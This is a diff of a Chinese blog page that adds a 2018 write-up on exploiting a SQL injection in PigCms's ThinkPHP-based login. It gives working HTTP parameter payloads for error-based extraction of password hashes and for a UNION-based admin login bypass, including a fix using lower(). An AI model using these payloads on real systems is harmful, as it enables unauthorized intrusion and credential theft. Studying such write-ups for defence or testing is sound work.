@@ -7,7 +7,7 @@
     
 
     <title>
-       | 拥雪待春色 
+      PigCms注入漏洞另类利用姿势 | 拥雪待春色 
     </title>
 
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
@@ -17,16 +17,20 @@
     
 
     <meta name="description" content="##0x01 前言 PigCms（又称小猪CMS）是一个基于php+mysql的多用户微信营销源码程序，由合肥彼岸互联信息技术有限公司开发，是国内使用最多、功能最强大、性能最稳定的多用户微信营销系统平台源码,目前国内大多数微信营销平台都是pigcms或由pigcms二次开发而成。因某次测试遇到该CMS，遂对该CMS进行分析，发现网上存在相关漏洞审计报告。于是参考网上相关报告进行利用测试，本文记录了">
+<meta name="keywords" content="注入">
 <meta property="og:type" content="article">
-<meta property="og:title" content=" | 拥雪待春色">
-<meta property="og:url" content="http://yoursite.com/2018/05/28/pigcms-sql/index.html">
+<meta property="og:title" content="PigCms注入漏洞另类利用姿势 | 拥雪待春色">
+<meta property="og:url" content="http://yoursite.com/2018/03/28/pigcms-sql/index.html">
 <meta property="og:site_name" content="拥雪待春色">
 <meta property="og:description" content="##0x01 前言 PigCms（又称小猪CMS）是一个基于php+mysql的多用户微信营销源码程序，由合肥彼岸互联信息技术有限公司开发，是国内使用最多、功能最强大、性能最稳定的多用户微信营销系统平台源码,目前国内大多数微信营销平台都是pigcms或由pigcms二次开发而成。因某次测试遇到该CMS，遂对该CMS进行分析，发现网上存在相关漏洞审计报告。于是参考网上相关报告进行利用测试，本文记录了">
 <meta property="og:locale" content="default">
-<meta property="og:updated_time" content="2018-05-28T07:05:09.937Z">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/1574161-f9b718d556f91f9c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/1574161-c37ce9df274b7dd1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2018-05-29T09:54:06.444Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content=" | 拥雪待春色">
+<meta name="twitter:title" content="PigCms注入漏洞另类利用姿势 | 拥雪待春色">
 <meta name="twitter:description" content="##0x01 前言 PigCms（又称小猪CMS）是一个基于php+mysql的多用户微信营销源码程序，由合肥彼岸互联信息技术有限公司开发，是国内使用最多、功能最强大、性能最稳定的多用户微信营销系统平台源码,目前国内大多数微信营销平台都是pigcms或由pigcms二次开发而成。因某次测试遇到该CMS，遂对该CMS进行分析，发现网上存在相关漏洞审计报告。于是参考网上相关报告进行利用测试，本文记录了">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/1574161-f9b718d556f91f9c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
     
     
     
@@ -150,17 +154,22 @@ classes that you can use:
 
   <header class="post-header">
     
-    <h1 class="post-title"></h1>
+    <h1 class="post-title">PigCms注入漏洞另类利用姿势</h1>
 
     
 
     <div class="post-meta">
-      <time datetime="2018-05-28" class="post-meta__date date">2018-05-28</time> 
+      <time datetime="2018-03-28" class="post-meta__date date">2018-03-28</time> 
 
       <span class="post-meta__tags tags">
 
           
 
+          
+             &#8226; 标签:
+            <font class="tags">
+              <a class="tags-link" href="/tags/注入/">注入</a>
+            </font>
           
 
       </span>
@@ -172,10 +181,17 @@ classes that you can use:
 
   <section id="post-content" class="article-content post">
     <p>##0x01 前言<br> PigCms（又称小猪CMS）是一个基于php+mysql的多用户微信营销源码程序，由合肥彼岸互联信息技术有限公司开发，是国内使用最多、功能最强大、性能最稳定的多用户微信营销系统平台源码,目前国内大多数微信营销平台都是pigcms或由pigcms二次开发而成。<br>因某次测试遇到该CMS，遂对该CMS进行分析，发现网上存在相关漏洞审计报告。于是参考网上相关报告进行利用测试，本文记录了利用过程中遇到的一些坑和姿势。</p>
-<p>##0x02 SQL注入<br> 由于PigCms是基于ThinkPHP二次开发。所以存在ThinkPHP相关漏洞。根据漏洞描述。在登录处即可进行SQL注入。<br> 漏洞详情：<a href="https://www.secpulse.com/archives/42886.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/42886.html</a></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">EXP：</span><br><span class="line">username[0]=%3D'__test__') or (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> pigcms_user <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) #<span class="keyword">between</span>&amp;username[<span class="number">1</span>]=freedomzz&amp;<span class="keyword">password</span>=<span class="number">123123</span>&amp;verifycode2=<span class="number">7218</span>&amp;__hash__=<span class="number">3e9</span>fde7441cc55bf46afe7f8361af205_3dd5ac82b216c5bf00b8207d99a7f76c</span><br></pre></td></tr></table></figure>
+<p>##0x02 SQL注入<br> 由于PigCms是基于ThinkPHP二次开发。所以存在ThinkPHP相关漏洞。根据漏洞描述。在登录处即可进行SQL注入。<br>漏洞详情：<a href="https://www.secpulse.com/archives/42886.html" target="_blank" rel="noopener">https://www.secpulse.com/archives/42886.html</a><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[0]=%3D'__test__') or (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>((<span class="keyword">select</span> <span class="keyword">password</span> <span class="keyword">from</span> pigcms_user <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) #<span class="keyword">between</span>&amp;username[<span class="number">1</span>]=freedomzz&amp;<span class="keyword">password</span>=<span class="number">123123</span>&amp;verifycode2=<span class="number">7218</span>&amp;__hash__=<span class="number">3e9</span>fde7441cc55bf46afe7f8361af205_3dd5ac82b216c5bf00b8207d99a7f76c</span><br></pre></td></tr></table></figure></p>
 <p>但查询出来后的密码无法解密，有没有其他的方法绕过呢，答案当然是有的，由于任何参数均可以注入，所以可以再后台登录处采用联合查询的方式，绕过登录的判断。从而进入后台。先来看看后台代码是怎么判断的</p>
-<p>AdminAction.class.php</p>
+<p>AdminAction.class.php<br><img src="https://upload-images.jianshu.io/upload_images/1574161-f9b718d556f91f9c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""></p>
+<p>常规的判断逻辑，通过用户名从数据库中查询用户原始密码，然后与POST传入的密码进行对比。如果相等则登录成功<br>所以我们可以通过联合查询修改返回信息，从而绕过判断。所以我们构造相关explpit<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[0]=%3D'admin') UNION <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="string">'admin'</span>,<span class="string">'21232F297A57A5A743894A0E4A801FC3'</span>,<span class="number">5</span>,<span class="number">1</span>,<span class="string">''</span>,<span class="number">1403421754</span>,<span class="string">'110.179.134.11'</span>,<span class="string">'1'</span>,<span class="string">'1'</span> #<span class="keyword">BETWEEN</span>&amp;username[<span class="number">1</span>]=<span class="keyword">admin</span>&amp;<span class="keyword">password</span>=<span class="keyword">admin</span>&amp;code=<span class="number">9554</span>&amp;__hash__=eb751331dfbecb9ca5a5aa73b0434cd3_e18f199b0e1044f89c721acd4676c6cf</span><br></pre></td></tr></table></figure></p>
+<p>顺便说一下，这个EXP有10个列。是因为目标多了一个列名，官方版本只有9个，所以如果针对官方版本的应删除一列。可以先通过语句查询一下pigcms_user表的列名数。然后构造相关SQL。</p>
+<p>按道理我这个SQL应该没问题了。但利用的时候就显示无法登陆，WTF! . SQL语句没问题啊。那我们故意将语句改错，看看最终查询的语句是啥<br><img src="https://upload-images.jianshu.io/upload_images/1574161-c37ce9df274b7dd1.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<p>可以看到我们的密文被转换为大写了。根据上面的第28行代码可以发现，如果两个密码不相等则报密码错误，大写字符与小写字符在!=判断中是为真的。及大写密文与小写密文是不相等的，所以我们需要返回密文修改为小写才可以通过判断。通过查询相关资料。在Mysql中可以通过lower()函数将字符串转换为小写。所以最终的EXP为：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username[0]=%3D'admin') UNION <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="string">'admin'</span>,<span class="keyword">lower</span>(<span class="string">'21232F297A57A5A743894A0E4A801FC3'</span>),<span class="number">5</span>,<span class="number">1</span>,<span class="string">''</span>,<span class="number">1403421754</span>,<span class="string">'110.179.134.11'</span>,<span class="string">'1'</span>,<span class="string">'1'</span> <span class="keyword">limit</span> <span class="number">1</span>,<span class="number">1</span>#<span class="keyword">BETWEEN</span>&amp;username[<span class="number">1</span>]=<span class="keyword">admin</span>&amp;<span class="keyword">password</span>=<span class="keyword">admin</span>&amp;code=<span class="number">7951</span>&amp;__hash__=eb751331dfbecb9ca5a5aa73b0434cd3_92c9c9351bcc5612016134275a89894f</span><br></pre></td></tr></table></figure>
+<p>使用该语句即可绕过登录，进入后台。</p>
+<p>##0x03 总结</p>
+<p>本文虽短。但在实际利用过程中，遇到的坑非常多。仔细分析与本地调试十分重要。建议在构造EXP之前先查询相关列名及列数以及用户名。然后再构造相关SQL语句。由于是15年的漏洞。具体修复方案不再详谈。</p>
 
   </section>
 
